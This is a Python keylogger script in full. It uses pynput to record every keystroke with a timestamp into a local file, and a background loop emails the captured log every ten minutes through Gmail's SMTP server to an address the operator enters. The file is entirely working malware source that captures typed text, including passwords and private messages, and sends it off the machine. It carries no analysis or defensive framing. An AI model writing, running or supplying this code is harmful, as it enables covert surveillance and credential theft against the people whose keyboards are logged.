import smtplib
import threading
from datetime import datetime
from email.mime.text import MIMEText
from pynput.keyboard import Listener
import time

def on_press(key):
    log_file = "key_log.txt"
    try:
        # Convert key to string and write to log file with timestamp
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        # If key is not a character(ctrl,shift,etc.), write it to log file with timestamp
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def schedule_email(interval):
    while True:
        time.sleep(interval)
        send_logs_via_email()


def send_logs_via_email():
    try:
        with open("key_log.txt", "r") as f:
            log_content = f.read()
        msg = MIMEText(log_content)
        msg["Subject"] = "Logs"
        msg["From"] = input("Enter your email:\n")
        msg["To"] = input("Enter the email to send the logs to:\n")

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(msg["From"], input("Enter your password:\n"))
            server.sendmail(msg["From"], msg["To"], msg.as_string())
        print("Logs successfully sent!")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    # Run the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Schedule sending logs every 10 minutes, modify the interval as needed
    schedule_email(interval=600)


